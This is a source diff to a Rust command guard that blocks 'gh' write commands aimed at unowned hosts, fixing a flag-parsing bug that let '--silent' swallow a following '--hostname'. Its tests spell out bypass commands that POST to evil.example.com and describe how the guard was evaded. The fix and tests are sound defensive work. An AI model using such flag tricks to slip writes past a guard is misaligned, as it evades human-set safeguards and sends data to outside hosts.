@@ -364,11 +364,7 @@ fn scan_unanimous_flag(
         // stray reading becomes a disagreement and disagreement blocks.
         if word.starts_with("--") {
             let takes_value = table.is_some_and(|t| (t.long_takes_value)(word));
-            i += if takes_value && !word.contains('=') {
-                2
-            } else {
-                1
-            };
+            i += long_flag_stride(word, takes_value);
             continue;
         }
         // Single-dash token: a shorthand cluster.
@@ -414,6 +410,27 @@ enum ClusterScan {
     ConsumedNext,
     /// The cluster could not be attributed — caller must fail closed.
     Unattributable,
+}
+
+/// How many argv tokens one `--long` flag occupies.
+///
+/// A long flag reaches for the FOLLOWING token only when the grammar says it
+/// takes a value AND that value is not already carried inline after `=`. Every
+/// boolean long occupies exactly one token.
+///
+/// **Every scanner in this file must answer `--long` here, before its shorthand
+/// arm — that ordering is load-bearing, not tidiness.** A long flag that falls
+/// through to a shorthand arm has only its leading `-` stripped, so `--silent`
+/// is walked as the cluster `-silent`; its trailing `t` is a value shorthand in
+/// [`GH_API_FLAGS`], so a boolean swallows the next token. When that token is a
+/// real `--hostname`, the guard never sees the host the write is sent to and
+/// falls back to the assumed-owned default — the #476 fail-open, respelled.
+fn long_flag_stride(word: &str, takes_value: bool) -> usize {
+    if takes_value && !word.contains('=') {
+        2
+    } else {
+        1
+    }
 }
 
 /// Whether a shorthand cluster consumes the FOLLOWING argv token as a value.
@@ -620,10 +637,12 @@ fn gh_command_host(command: &str) -> String {
             .filter(|host| !host.is_empty())
         {
             flag_host = Some(host.to_ascii_lowercase());
-        } else if table.is_some_and(|t| (t.long_takes_value)(token)) && !token.contains('=') {
-            // A following token is this flag's value, even when that value
-            // happens to be the literal `--hostname`.
-            index += 2;
+        } else if token.starts_with("--") {
+            // Any other long flag. A value-taking one owns the following token
+            // even when that value is the literal `--hostname`; a boolean long
+            // owns nothing. Answering `--` HERE is what keeps `--silent` out of
+            // the shorthand arm below — see [`long_flag_stride`].
+            index += long_flag_stride(token, table.is_some_and(|t| (t.long_takes_value)(token)));
             continue;
         } else if let Some(cluster) = token.strip_prefix('-')
             && table.is_some_and(|t| cluster_consumes_next(cluster, t.value_shorts))
@@ -1146,17 +1165,9 @@ fn gh_repo_positional_target(segment: &str) -> Option<(String, Option<String>, S
             let target = argv.get(i + 1)?;
             return non_flag_target(verb, target);
         }
-        if let Some(name) = word.strip_prefix("--") {
+        if word.starts_with("--") {
             // `--flag=value` carries its value inline, so nothing to step over.
-            if name.contains('=') {
-                i += 1;
-                continue;
-            }
-            i += if REPO_VERB_VALUE_FLAGS.contains(&word) {
-                2
-            } else {
-                1
-            };
+            i += long_flag_stride(word, REPO_VERB_VALUE_FLAGS.contains(&word));
             continue;
         }
         if let Some(cluster) = word.strip_prefix('-')
@@ -3765,6 +3776,97 @@ mod tests {
                     matches!(result.outcome, cadence_hooks_core::Outcome::Block),
                     "{command}"
                 );
+            }
+        });
+    }
+
+    #[test]
+    fn boolean_long_ending_in_an_api_value_letter_cannot_swallow_hostname() {
+        // #532 second review repro. The host scan fell from the long-flag table
+        // straight into the shorthand arm, where `strip_prefix('-')` leaves
+        // `--silent` as the cluster `-silent`. Its LAST letter `t` is a value
+        // shorthand in `gh api`, so the boolean skipped the following token —
+        // the real `--hostname`. gh sends the write to evil.example.com while
+        // the guard resolves the assumed-owned default and ALLOWS. `--silent`
+        // and `--slurp` are booleans in gh 2.96.0's own `gh api --help`
+        // (`--silent  Do not print the response body`); their trailing `t`/`p`
+        // are the whole cause, and `--silent` on a write is routine.
+        with_env(&owners_env(), || {
+            for command in [
+                "gh api --silent --hostname evil.example.com repos/cameronsjo/x -X POST -f a=b",
+                "gh api --slurp --hostname evil.example.com repos/cameronsjo/x -X POST -f a=b",
+                "gh api --silent --hostname=evil.example.com repos/cameronsjo/x -X POST -f a=b",
+                "gh api --slurp --hostname=evil.example.com repos/cameronsjo/x -X POST -f a=b",
+            ] {
+                let input = input_with(command, "/tmp");
+                let result = GhWriteGuard.run(&input);
+                let meta = result.block_metadata.expect("structured block");
+                assert_eq!(meta.rule_id, "gh-write-unauthorized-target", "{command}");
+            }
+        });
+    }
+
+    #[test]
+    fn api_hostname_resolves_after_every_boolean_spelling() {
+        // Controls isolating the cause to the trailing letter rather than to
+        // long flags generally. `--paginate` and `--verbose` end in `e` and
+        // always resolved; `-i` is `gh api`'s sole boolean shorthand; the bare
+        // form has no preceding flag at all. All must still reach the host.
+        with_env(&owners_env(), || {
+            for command in [
+                "gh api --paginate --hostname evil.example.com repos/cameronsjo/x -X POST -f a=b",
+                "gh api --verbose --hostname evil.example.com repos/cameronsjo/x -X POST -f a=b",
+                "gh api -i --hostname evil.example.com repos/cameronsjo/x -X POST -f a=b",
+                "gh api --hostname evil.example.com repos/cameronsjo/x -X POST -f a=b",
+            ] {
+                let input = input_with(command, "/tmp");
+                let result = GhWriteGuard.run(&input);
+                let meta = result.block_metadata.expect("structured block");
+                assert_eq!(meta.rule_id, "gh-write-unauthorized-target", "{command}");
+            }
+        });
+    }
+
+    #[test]
+    fn api_value_taking_longs_still_skip_their_values() {
+        // The other half of the control: short-circuiting `--` must not cost
+        // the table its value-taking longs. Each carries a literal
+        // `--hostname` as its value, so a scanner that stopped stepping over
+        // it would read a host and false-block. All resolve the owned default
+        // and allow. The `=` spelling carries its value inline, so the token
+        // after it is a real flag — and there the guard must NOT step over it.
+        with_env(&owners_env(), || {
+            for command in [
+                "gh api repos/cameronsjo/x -X POST --jq --hostname -f a=b",
+                "gh api repos/cameronsjo/x -X POST --template --hostname -f a=b",
+                "gh api repos/cameronsjo/x -X POST --header --hostname -f a=b",
+                "gh api repos/cameronsjo/x -X POST --cache --hostname -f a=b",
+                "gh api repos/cameronsjo/x -X POST --field --hostname -f a=b",
+            ] {
+                let input = input_with(command, "/tmp");
+                let result = GhWriteGuard.run(&input);
+                assert!(
+                    matches!(result.outcome, cadence_hooks_core::Outcome::Allow),
+                    "{command}"
+                );
+            }
+        });
+    }
+
+    #[test]
+    fn inline_long_value_does_not_hide_the_hostname_that_follows() {
+        // `--jq=.x` carries its value inline, so the NEXT token is a real flag.
+        // A stride that skipped one anyway would swallow the `--hostname` and
+        // fail open exactly as the cluster misread did.
+        with_env(&owners_env(), || {
+            for command in [
+                "gh api repos/cameronsjo/x -X POST --jq=.x --hostname evil.example.com -f a=b",
+                "gh api repos/cameronsjo/x -X POST --template={{.x}} --hostname evil.example.com -f a=b",
+            ] {
+                let input = input_with(command, "/tmp");
+                let result = GhWriteGuard.run(&input);
+                let meta = result.block_metadata.expect("structured block");
+                assert_eq!(meta.rule_id, "gh-write-unauthorized-target", "{command}");
             }
         });
     }
